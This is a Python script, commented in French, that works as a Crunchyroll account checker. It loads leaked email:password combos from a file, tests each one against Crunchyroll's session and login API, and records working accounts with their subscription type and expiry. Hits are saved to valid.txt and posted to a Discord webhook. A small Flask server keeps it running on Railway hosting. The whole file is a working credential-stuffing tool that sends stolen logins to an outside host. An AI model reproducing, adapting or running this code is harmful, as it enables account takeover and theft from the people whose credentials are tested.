import os
import threading
import json
import sys
import requests
from flask import Flask
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import init, Fore
from bs4 import BeautifulSoup

# Initialisation
init(autoreset=True)
app = Flask(__name__)

# --- CONFIGURATION ---
webhookurl = os.environ.get("WEBHOOK_URL", "") # Utilise les variables d'environnement Railway
debug = False
iscapture = False

# Lecture sécurisée des combos
def get_combos():
    if os.path.exists("combos.txt"):
        with open("combos.txt", 'r') as f:
            return f.read().splitlines()
    return []

def crunchycheck():
    combos = get_combos()
    print(f"[{Fore.BLUE}INFO{Fore.RESET}] {len(combos)} combos chargés. Début du check...")

    for i, combo in enumerate(combos):
        try:
            if iscapture:
                line = combo.split(" ")[0].split(":")
            else:
                line = combo.split(":")
            
            if len(line) < 2: continue
            
            email, password = line[0], line[1]

            # Session Start
            r = requests.post('https://api.crunchyroll.com/start_session.0.json', data={
                'version': '1.0', 
                'access_token': 'LNDJgOit5yaRIWN',
                'device_type': 'com.crunchyroll.windows.desktop', 
                'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId', 
                'account': email, 
                'password': password
            }, timeout=10)

            if "session_id" in r.text:
                data = r.json()["data"]
                session_id = data["session_id"]
                
                # Login
                rl = requests.post('https://api.crunchyroll.com/login.0.json', data={
                    'account': email, 'password': password, 'session_id': session_id
                }, timeout=10)

                info = rl.json()
                if info.get("code") == "ok":
                    userdata = info["data"]["user"]
                    expire = info["data"]["expires"]
                    sub = userdata["access_type"]
                    
                    result = f"[VALID] {email}:{password} | Sub: {sub} | Exp: {expire}"
                    print(Fore.GREEN + result)
                    
                    # Log local (Attention: Railway reset les fichiers au restart)
                    with open("valid.txt", "a") as f:
                        f.write(result + "\n")

                    # Webhook Discord
                    if webhookurl:
                        webhook = DiscordWebhook(url=webhookurl, content=result)
                        webhook.execute()
                else:
                    print(f"[{i}] {Fore.RED}Invalide: {email}")

        except Exception as e:
            if debug: print(f"Erreur sur {combo}: {e}")
            continue

# --- PARTIE SERVEUR POUR RAILWAY ---
@app.route('/')
def health_check():
    return {"status": "running", "message": "Crunchyroll Checker is active"}, 200

def run_flask():
    # Railway utilise la variable PORT
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    # 1. Lancer le serveur web en arrière-plan
    threading.Thread(target=run_flask, daemon=True).start()
    
    # 2. Lancer le checker
    crunchycheck()
